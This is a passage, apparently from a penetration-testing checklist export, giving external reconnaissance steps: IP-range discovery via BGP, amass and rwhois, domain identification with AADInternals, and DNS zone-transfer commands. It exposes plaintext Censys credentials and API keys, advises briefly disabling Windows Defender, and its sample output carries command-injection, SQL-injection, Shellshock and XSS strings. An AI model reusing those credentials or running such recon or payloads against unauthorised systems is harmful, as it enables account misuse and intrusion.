						"hasLinkedFinding": false
					},
					{
						"uid": "f9ef1073-b618-4db9-9d73-9a72585b6593",
						"name": "Enumerate Company's IP Ranges - BGP",
						"instructions": "<h2>Instructions</h2><p>Use enumerated company and subsidiary names to identify IP ranges using a BGP search.</p><h2><strong>Variation: Manual Review</strong></h2><p>1. Use enumerated company and subsidiary names to identify IP ranges using a BGP search. The site is accessible at https://bgp.he.net/</p><p><strong>Note:</strong> Sometimes company's register their IP block under slightly different names.</p><h2><strong>Report Requirements</strong></h2><p>Include a list of all discovered IP ranges in the task notes or attach them as a .txt file to the project documents.</p><h2><strong>Additional Notes</strong></h2><p>Below is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.</p><p>1. Place all in scope IPs, IP Ranges, and CIDR network into one file.</p><p>2. Run the following command in Linux to expand the ranges/networks and create a new file with one IP per line.</p><pre><code>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v \"address\" | grep -v \"nmap\" | sort | uniq&gt; IPs_ClientProvided.txt</code></pre><p>3. Import IPs_ClientProvided.txt into the Artifacts section for the project.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064482,
							"uid": "4bb01030-a11a-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified IP Ranges - BGP",
							"description": "<p>Use enumerated company and subsidiary names to identify IP ranges they own using common IP registries.</p><p>Note: Please note that this is only done when blind company discovery in explicitly included in scope.</p>",
							"severityId": -2,
							"businessImpact": "<p>NA</p>",
							"sourceIdentifier": "M:04986fa4-af1c-4143-9055-e549c5152ec4",
							"verificationInstructions": "<h2>Instructions</h2><p>Use enumerated company and subsidiary names to identify IP ranges using a BGP search. </p><h2><strong>Variation: Manual Review</strong></h2><p>1. Use enumerated company and subsidiary names to identify IP ranges using a BGP search. The site is accessible at https://bgp.he.net/</p><p>Note: Sometimes company's register their IP block under slightly different names.  </p><h2><strong>Report Requirements</strong></h2><p>Include a list of all discovered IP ranges in the task notes or attach them as a .txt file to the project documents.</p><h2><strong>Additional Notes</strong></h2><p>Below is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.</p><p>1. Place all in scope IPs, IP Ranges, and CIDR network into one file.</p><p>2. Run the following command in linux to expand the ranges/networks  and create a new file with one IP per line.</p><pre><code>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v &quot;address&quot; | grep -v &quot;nmap&quot; | sort | uniq&gt; IPs_ClientProvided.txt</code></pre><p>3. Import IPs_ClientProvided.txt into the Artifacts section for the project.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>NA</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "1b1d4217-7af5-48bb-9e73-8c4ad241df0c",
						"name": "Enumerate Company's IP Ranges - Amass",
						"instructions": "<h2>Instructions</h2><p>Once domain names and subdomains have been enumerated run amass against them in an attempt to identify additional ranges.  This can be useful for sites that live in hosted environments.  </p><p><strong>Important Note: </strong>You may want to consider running through the entire DNS recon process list for the sake of being complete.</p><h2><strong>Variation: Amass</strong></h2><p>1. Install amass via apt.</p><pre><code>sudo apt install amass</code></pre><p>OR via go.</p><pre><code>go install -v github.com/OWASP/Amass/v3/...@master</code></pre><p>2. Run amass against discovered domain names.</p><pre><code>amass enum -d netspi.com</code></pre><h3>Example:</h3><pre><code><strong>amass enum -d netspi.com</strong>\n\nresolve-poc7.netspi.com\nresolve-poc5.netspi.com\nrepository-ext.netspi.com\nresolve-poc8.netspi.com\nresolve-poc10.netspi.com\n<strong>[TRUNCATED]</strong>\n\nOWASP Amass v3.19.2                               https://github.com/OWASP/Amass\n--------------------------------------------------------------------------------\n60 names discovered - cert: 47, scrape: 2, dns: 7, crawl: 1, archive: 3\n--------------------------------------------------------------------------------\nASN: 397919 - AS397919\n        76.76.14.0/24           13   Subdomain Name(s)\nASN: 15169 - GOOGLE - Google LLC\n        34.120.0.0/14           5    Subdomain Name(s)\nASN: 16509 - AMAZON-02 - Amazon.com, Inc.\n        2600:9000:2038::/45     8    Subdomain Name(s)\n        18.188.0.0/16           1    Subdomain Name(s)\n        13.227.36.0/22          4    Subdomain Name(s)\n        3.16.0.0/14             1    Subdomain Name(s)\n        3.20.0.0/14             1    Subdomain Name(s)\n        13.225.41.0/24          4    Subdomain Name(s)\n        108.156.88.0/21         4    Subdomain Name(s)\n        18.224.0.0/14           1    Subdomain Name(s)\n        18.66.248.0/22          4    Subdomain Name(s)\n        13.225.60.0/22          4    Subdomain Name(s)\n        99.84.36.0/22           4    Subdomain Name(s)\n        108.156.104.0/21        4    Subdomain Name(s)\nASN: 8075 - MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation\n        40.68.0.0/14            1    Subdomain Name(s)\n        13.64.0.0/11            4    Subdomain Name(s)\n        52.96.0.0/14            4    Subdomain Name(s)\n        2603:1000::/26          4    Subdomain Name(s)\n        52.146.0.0/15           1    Subdomain Name(s)\nASN: 0 - Reserved Network Address Blocks\n        240.0.0.0/4             1    Subdomain Name(s)\nASN: 54113 - FASTLY - Fastly\n        185.199.108.0/22        8    Subdomain Name(s)\n        2606:50c0:8000::/46     8    Subdomain Name(s)\nASN: 14618 - AMAZON-AES - Amazon.com, Inc.\n        54.144.0.0/14           3    Subdomain Name(s)\n        34.192.0.0/12           6    Subdomain Name(s)\n        34.224.0.0/12           3    Subdomain Name(s)\n        54.236.64.0/18          1    Subdomain Name(s)\n        50.17.0.0/16            1    Subdomain Name(s)\n        107.22.0.0/16           1    Subdomain Name(s)\n        3.208.0.0/12            5    Subdomain Name(s)\n        3.224.0.0/12            2    Subdomain Name(s)\n        54.164.0.0/15           2    Subdomain Name(s)\n        52.2.0.0/15             1    Subdomain Name(s)\n        54.166.0.0/15           1    Subdomain Name(s)\n        52.72.0.0/15            1    Subdomain Name(s)\n        54.92.128.0/17          1    Subdomain Name(s)\n        3.208.0.0/13            1    Subdomain Name(s)\n        18.204.0.0/14           1    Subdomain Name(s)\n        54.156.0.0/14           1    Subdomain Name(s)\n        35.168.0.0/13           2    Subdomain Name(s)\n        52.44.0.0/15            1    Subdomain Name(s)\n\nThe enumeration has finished\nDiscoveries are being migrated into the local database</code></pre><p>3. Review domains, sub domains, and ip address ranges.</p><h2><strong>Report Requirements</strong></h2><p>Record new discovered IP ranges and perform additional domain recon task against them.</p><h2><strong>Additional Notes</strong></h2><p>Below are some potential tool links.</p><ul><li><p>https://github.com/yamakira/censys-enumeration</p></li><li><p>https://github.com/OWASP/Amass/releases</p></li><li><p>https://github.com/aboul3la/Sublist3r</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064483,
							"uid": "3e6d476c-a11a-e911-810c-ecf4bbd04083",
							"name": "General Information - Identified IP Ranges - DNS Lookup",
							"description": "<p>Once domain names and subdomains have been enumerated run amass against them in an attempt to identify additional ranges.  This can be useful for sites that live in hosted environments.</p>",
							"severityId": -2,
							"businessImpact": "<p>NA</p>",
							"sourceIdentifier": "M:7ab067ae-9976-4ed8-9965-371cf8395a5d",
							"verificationInstructions": "<p><strong>Instructions - Amass</strong></p><p>1.  Download amass from github.com</p><p>https://github.com/OWASP/Amass</p><p>https://github.com/OWASP/Amass/releases</p><p>2. Compile or download the release. The release is usually the easiest to get working.</p><p>3. Run amass against discovered domain names.</p><p>root@kali:~&#35; ./amass -d netspi.com -v</p><p>[CertSpotter]     sqli.netspi.com</p><p>[CertSpotter]     resolve-poc2.netspi.com</p><p>[CertSpotter]     email.netspi.com</p><p>[VirusTotal]      sqlwiki.netspi.com</p><p>[CertSpotter]     autodiscover.netspi.com</p><p>[CertSpotter]     resolve-poc1.netspi.com</p><p>Amass v2.5.2                                            Jeff Foley (@jeff_foley)</p><p>--------------------------------------------------------------------------------</p><p>37 names discovered - cert: 22, scrape: 11, alt: 3, dns: 1</p><p>--------------------------------------------------------------------------------</p><p>ASN: 14618 - AMAZON-AES - Amazon.com, Inc., US</p><p>        35.168.0.0/13           1    Subdomain Name(s)</p><p>        52.72.0.0/15            1    Subdomain Name(s)</p><p>        34.224.0.0/12           1    Subdomain Name(s)</p><p>        18.208.0.0/13           1    Subdomain Name(s)</p><p>        18.204.0.0/14           1    Subdomain Name(s)</p><p>ASN: 54113 - FASTLY - Fastly, US</p><p>        185.199.109.0/24        1    Subdomain Name(s)</p><p>ASN: 2828 - XO-AS15 - MCI Communications Services, Inc. d/b/a Verizon Business, US</p><p>        209.116.0.0/14          18   Subdomain Name(s)</p><p>        207.86.0.0/15           1    Subdomain Name(s)</p><p>ASN: 7922 - COMCAST-7922 - Comcast Cable Communications, LLC, US</p><p>        75.144.0.0/13           1    Subdomain Name(s)</p><p>ASN: 15169 - GOOGLE - Google LLC, US</p><p>        104.197.192.0/19        11   Subdomain Name(s)</p><p>4. Review domains, sub domains, and ip address ranges.</p><p><strong>Instructions - Censys</strong></p><p>1. Visit the site and enter domain names and the company name.</p><p>https://www.censys.io</p><p>If you need to login to bypass some of the anonymous user limits, you can use the following credentials:</p><p>Username: IT@netspi.com</p><p>Password: 4zF7dPxQjHDk</p><p><strong>Additional Option</strong></p><p>Many people have also had success with:</p><p>https://github.com/yamakira/censys-enumeration</p><p>You can use the following API information with the tool above:</p><p>API ID: 3432d84a-b671-4f41-82dd-6718c08ee6f0</p><p>API Secret: sKRhj62qHYv5UZltK9qRmLbmJlvuv1L5</p><p>2. Review domains and the associate IP blocks for potential IP ranges in use.</p><p><strong>Reporting Requirements</strong></p><p>Record new discovered IP ranges and perform additional domain recon task against them.</p>",
							"references": "<ul><li>https://github.com/yamakira/censys-enumeration</li><li>https://github.com/OWASP/Amass/releases</li><li>https://github.com/aboul3la/Sublist3r</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>NA</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2afa0444-b417-4d2c-90ae-c6234e79a38f",
						"name": "Enumerate Company's IP Ranges - Whois",
						"instructions": "<h2>Instructions</h2><p>Use enumerated company and subsidiary names and IP address to identify additional IP ranges they own using whois services.</p><h2><strong>Variation: WHOIS - ReferralServer Lookup</strong></h2><p>1. Run a whois lookup against the target domain or IP. Look for a &quot;ReferralServer&quot;:</p><pre><code><strong>whois 38.122.55.16 | grep -i referral</strong>\nReferralServer:  rwhois://rwhois.cogentco.com:4321\nFound a referral to rwhois.cogentco.com:4321.</code></pre><p>2. Issue a subsequent whois query against the referral server, with a search term (e.g. partial company name) as the last parameter. Output may be limited / searches too generic. Additional, more specific queries will help narrow down the desired results.</p><pre><code><strong>whois -h rwhois.cogentco.com -p 4321 Wasmer</strong>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\nWasmer, Schroeder, and Company (NET4-267A37101E) 38.122.55.16 - 38.122.55.19\nWasmer, Schroeder, and Company (NET4-268C8F481D) 38.140.143.72 - 38.140.143.79\nWasmer, Schroeder, and Company (NET6-200105500002009D70) 2001:550:2:9D::39:0 - 2001:550:2:9D::39:FFFF\n%ok</code></pre><p>3. Below is an example of a broad search.</p><pre><code><strong>whois -h rwhois.cogentco.com -p 4321 &quot;Assured&quot;</strong>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\nAssured Data Protection (NET4-261B690018) 38.27.105.0 - 38.27.105.255\nAssured Data Protection (NET4-2658F9901D) 38.88.249.144 - 38.88.249.151\nAssured Data Protection (NET4-268EDFD01D) 38.142.223.208 - 38.142.223.215\nAssured Data Protection (NET6-200105500002000170) 2001:550:2:1::2B:0 - 2001:550:2:1::2B:FFFF\nAssured Data Protection (NET6-200105500002002F70) 2001:550:2:2F::D0:0 - 2001:550:2:2F::D0:FFFF\n%error 330 Exceeded maximum objects limit</code></pre><p>3. Below is the desired results from modified search term:</p><pre><code><strong>[~] whois -h rwhois.cogentco.com -p 4321 &quot;Guaranty&quot;</strong>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\n<strong><span style=\"color: #DB2719\">Assured Guaranty Municipal Corp DBA AGO (NET4-266873801D) 38.104.115.128 - 38.104.115.135\n</span></strong><strong><span style=\"color: #DB2719\">Assured Guaranty Municipal Corp DBA AGO (NET4-268CF9801D) 38.140.249.128 - 38.140.249.135\n</span></strong><strong><span style=\"color: #DB2719\">Assured Guaranty Municipal Corp DBA AGO (NET6-200105500002000470) 2001:550:2:4::1:0 - 2001:550:2:4::1:FFFF\n</span></strong><strong><span style=\"color: #DB2719\">Assured Guaranty Municipal Corp DBA AGO (NET6-200105500002004E70) 2001:550:2:4E::15A:0 - 2001:550:2:4E::15A:FFFF\n</span></strong><strong><span style=\"color: #DB2719\">Illinois Insurance Guaranty Fund (NET4-267C34C01C) 38.124.52.192 - 38.124.52.207\n</span></strong><strong><span style=\"color: #DB2719\">%error 330 Exceeded maximum objects limit</span></strong></code></pre><h2><strong>Additional Notes</strong></h2><p>https://www.ripe.net/publications/docs/ripe-358&#35;23 may also be of some use.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 3,
				"collapsed": true
			},
			{
				"uid": "e8832700-80c3-4f1a-8bbd-3c239e7088df",
				"name": "Reconnaissance: Domain Names",
				"description": "This goal of this task group is to identify domains associated with in scope IP addresses owned by the client.",
				"type": 1,
				"tasks": [
					{
						"uid": "96de4339-e86a-4021-9abb-4c8edfe03755",
						"name": "Identify Primary Domains [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>A consultant will need to select which primary domains should be targeted for subdomain enumeration during the engagement. Oftentimes companies will have several primary domains that show up during initial reconnaissance, and some companies will have dozens. </p><p>Subdomain enumeration is cyclical process. Additional primary domains may show up in things like reverse DNS records or SSL certificates used by the in-scope assets for example. Each time a new primary domain is encountered, the consultant will need to decide if it should be targeted for subdomain enumeration or ignored. The items in this checklist group can be performed multiple times depending on how many primary domains are encountered during the reconnaissance and information gathering phases.</p><h2>Instructions</h2><ol><li><p>Unless specific instructions have been supplied by the client, use the following primary domains as a starting point:</p><ol><li><p>Any primary domain the client supplied as an in-scope target (either directly, or as part of a supplied in-scope URL)</p></li><li><p>The domain found in the client contact's email address in the Platform Kickoff tab</p></li><li><p>Primary domains identified by the AADInternals <code>Invoke-AADIntReconAsOutsider</code> command, as shown in the variation below, if any of the domains obtained from points a. or b. above are managed by Microsoft.</p></li><li><p>Primary domains identified through SSL Certificate Scanning (see associated checklist task in this task group).</p></li></ol></li><li><p>Perform the subdomain enumeration tasks outlined by the rest of the checklist items in this checklist group.</p></li><li><p>If new primary domains are discovered later on, perform additional subdomain enumeration on those domains as time allows.</p><ol><li><p>Try to identify which primary domains are more heavily utilized in order to prioritize the enumeration efforts. If only a handful of primary domains are identified, they can generally all be enumerated, however if many primary domains are identified it may not be reasonable or time efficient to try to enumerate all of them based on the engagement timeline.</p></li><li><p>Websites like <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.securitytrails.com\">https://www.securitytrails.com</a> and <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.shodan.io\">https://www.shodan.io</a> can be useful to quickly identify how many potential subdomains might be present for a given primary domain. If very few subdomains seem to be associated with the primary domain, it might not be worthwhile to spend the time enumerating it.</p></li></ol></li></ol><h2>Variation: AADInternals</h2><h3>Install</h3><pre><code>PS C:\\&gt; Install-Module AADInternals</code></pre><h3>Execution Example</h3><p><strong>Note:</strong> Windows Defender has recently begun to flag this tool. If you're not able to successfully install or import the module, disable Windows Defender real-time protection temporarily on your VM, launch a new PowerShell session, and try again.</p><p>Note that in the example below, one additional primary domain to target for subdomain enumeration was discovered (</p><pre><code>silentbreaksecurity.com</code></pre><p>). For the purposes of subdomain enumeration, <code>*.onmicrosoft.com</code> domains can typically be ignored.</p><p></p><pre><code><strong>PS C:\\&gt; Import-Module AADInternals\nPS C:\\&gt; Invoke-AADIntReconAsOutsider -DomainName netspi.com -GetRelayingParties | Format-Table</strong>\nTenant brand:       NetSPI\nTenant name:        netspi.onmicrosoft.com\nTenant id:          47bfc77a-6733-477b-a2b2-ecf6b199e835\nTenant region:      NA\nDesktopSSO enabled: True\nMDI instance:       netspi.atp.azure.com\nUses cloud sync:    True\n\nName                         DNS    MX  SPF DMARC Type    STS\n----                         ---    --  --- ----- ----    ---\n<span style=\"color: rgb(219, 39, 25)\"><strong>netspi.com</strong></span>                  True  True True False Managed\nnetspi.mail.onmicrosoft.com True  True True False Managed\nnetspi.onmicrosoft.com      True  True True False Managed\n<span style=\"color: rgb(219, 39, 25)\"><strong>silentbreaksecurity.com</strong></span>     True False True False Managed</code></pre><h2>Reporting Requirements</h2><ol><li><p>For convenience, list each primary domain that was identified and targeted for subdomain enumeration in a comment on this checklist item.</p></li><li><p>Add the primary domains that were targeted for subdomain enumeration to a clearly-labeled sheet in a newly-created (or existing) master spreadsheet maintained for the project. </p></li><li><p>Ultimately, this spreadsheet will get uploaded to the Internal Documents folder after the project is completed.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "1ad0e0a3-e716-4f9d-9da5-bc35940d02a6",
						"name": "Zone Transfer [ExPowerPen]",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": false,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 16893,
							"uid": "3ff3984e-03b1-dd11-992f-001e4f120030",
							"name": "Weak Configuration - DNS - Zone Transfer",
							"description": "<p>The domain name server includes full zone transfer (AXFR) specification. While this mechanism is useful to replicate zone information between servers, it can also be used to gather various information for subdomain enumeration, mass mailing, DDoS attacks, and other malicious purposes.</p>",
							"severityId": 2,
							"businessImpact": "<p>By knowing the names of the various servers in your domain, an attacker may be able to launch more sophisticated attacks.</p>",
							"sourceIdentifier": "GID:2861",
							"verificationInstructions": "<h2>Background Information</h2><p>A DNS zone transfer, also known as an AXFR query, is a process by which a DNS server replicates a part of its database to another DNS server. The portion of the database that is replicated is known as a zone. A zone transfer uses the TCP DNS port (usually TCP/53) as opposed to the standard UDP DNS port (UDP/53). It is a client-initiated request, typically sent from a secondary DNS server hosting the zone.</p><p>Since the AXFR protocol offers no authentication, any client can request a copy of the entire zone from a misconfigured DNS server. Retrieving the entire zone can allow an attacker to gather subdomains during subdomain enumeration activities or gain additional information about the targeted organization, such as their naming conventions for critical assets.</p><h2>Instructions</h2><p>Perform a DNS Zone Transfer and review the results for new domains and internal hostnames/IPs. If you don't know which domain to try initially, review reverse DNS records for IP addresses associated with the project and try domains that are present there. You can use <code>nmap -sL -iL in-scope-ips.txt</code> to perform a list scan that returns reverse DNS records for the set of in-scope IP addresses.</p><h2><strong>Variation: dnsrecon (Recommended)</strong></h2><p>dnsrecon is recommended because it automatically identifies all nameservers associated with the target domain and attempts a zone transfer against each one.</p><h3>Install</h3><pre><code>$ sudo apt install dnsrecon</code></pre><h3><strong>Execution Example:</strong></h3><pre><code><strong>$ dnsrecon -d zonetransfer.me -t axfr</strong>\n[&#42;] Checking for Zone Transfer for zonetransfer.me name servers\n[&#42;] Resolving SOA Record\n[+]      SOA nsztm1.digi.ninja 81.4.108.41\n[&#42;] Resolving NS Records\n[&#42;] NS Servers found:\n[+]      NS nsztm2.digi.ninja 34.225.33.2\n[+]      NS nsztm1.digi.ninja 81.4.108.41\n[&#42;] Removing any duplicate NS server IP Addresses...\n[&#42;]\n[&#42;] Trying NS server 81.4.108.41\n[+] 81.4.108.41 Has port 53 TCP Open\n<strong><span style=\"color: #DB2719\">[+] Zone Transfer was successful!!\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      SOA nsztm1.digi.ninja 81.4.108.41\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      NS nsztm1.digi.ninja 81.4.108.41\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      NS nsztm2.digi.ninja 34.225.33.2\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      NS intns1.zonetransfer.me 81.4.108.41\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      NS intns2.zonetransfer.me 52.91.28.78\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT 6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT ; ls\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT AbCdEfG\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT Hi to Josh and all his class\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT Robin Wood\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT ' or 1=1 --\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT () { :]}; echo ShellShocked\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      PTR www.zonetransfer.me 5.196.105.14\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 173.194.194.26\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2607:f8b0:4001:c08::1a\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.77.26\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2607:f8b0:4023:401::1a\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 173.194.219.27\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2607:f8b0:4002:c03::1a\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.77.27\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2607:f8b0:4023:401::1a\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 173.194.219.27\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2607:f8b0:4002:c03::1b\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 142.250.112.27\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2607:f8b0:4023:1402::1b\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 172.217.197.27\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400d:c0f::1b\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      AAAA deadbeef.zonetransfer.me dead:beaf::\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A @.zonetransfer.me 5.196.105.14\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A asfdbbox.zonetransfer.me 127.0.0.1\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A canberra-office.zonetransfer.me 202.14.81.230\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A dc-office.zonetransfer.me 143.228.181.132\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A email.zonetransfer.me 74.125.206.26\n</span></strong><strong>[TRUNCATED]</strong>\n[&#42;]\n[&#42;] Trying NS server 34.225.33.2\n<strong>[TRUNCATED]</strong></code></pre><h2>Variation: dig</h2><h3>Install</h3><pre><code>$ sudo apt install dnsutils</code></pre><h3><strong>Execution Example:</strong></h3><pre><code><strong>$ dig axfr @nsztm1.digi.ninja zonetransfer.me</strong>\n\n; &lt;&lt;&gt;&gt; DiG 9.19.17-1-Debian &lt;&lt;&gt;&gt; axfr @nsztm1.digi.ninja zonetransfer.me\n; (1 server found)\n;; global options: +cmd\n<strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        300     IN      HINFO   &quot;Casio fx-700G&quot; &quot;Windows XP&quot;\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        301     IN      TXT     &quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      0 ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      10 ALT1.ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      10 ALT2.ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX2.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX3.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX4.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX5.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      A       5.196.105.14\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      NS      nsztm1.digi.ninja.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      NS      nsztm2.digi.ninja.\n</span></strong><strong><span style=\"color: #DB2719\">_acme-challenge.zonetransfer.me. 301 IN TXT     &quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;\n</span></strong><strong><span style=\"color: #DB2719\">_sip._tcp.zonetransfer.me. 14000 IN     SRV     0 0 5060 www.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">asfdbauthdns.zonetransfer.me. 7900 IN   AFSDB   1 asfdbbox.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">asfdbbox.zonetransfer.me. 7200  IN      A       127.0.0.1\n</span></strong><strong><span style=\"color: #DB2719\">asfdbvolume.zonetransfer.me. 7800 IN    AFSDB   1 asfdbbox.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">canberra-office.zonetransfer.me. 7200 IN A      202.14.81.230\n</span></strong><strong><span style=\"color: #DB2719\">cmdexec.zonetransfer.me. 300    IN      TXT     &quot;; ls&quot;\n</span></strong><strong><span style=\"color: #DB2719\">contact.zonetransfer.me. 2592000 IN     TXT     &quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;\n</span></strong><strong><span style=\"color: #DB2719\">dc-office.zonetransfer.me. 7200 IN      A       143.228.181.132\n</span></strong><strong><span style=\"color: #DB2719\">deadbeef.zonetransfer.me. 7201  IN      AAAA    dead:beaf::\n</span></strong><strong>[TRUNCATED]</strong>\n;; Query time: 107 msec\n;; SERVER: 81.4.108.41&#35;53(nsztm1.digi.ninja) (TCP)\n;; WHEN: Fri Jan 05 00:45:42 CST 2024\n;; XFR size: 50 records (messages 1, bytes 2085)</code></pre><h2><strong>Variation: host</strong></h2><h3>Install</h3><pre><code>$ sudo apt install dnsutils</code></pre><h3><strong>Execution Example:</strong></h3><pre><code><strong>$ host -t axfr zonetransfer.me nsztm1.digi.ninja</strong>\nTrying &quot;zonetransfer.me&quot;\nUsing domain server:\nName: nsztm1.digi.ninja\nAddress: 81.4.108.41&#35;53\nAliases:\n\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32717\n;; flags: qr aa; QUERY: 1, ANSWER: 50, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;zonetransfer.me.     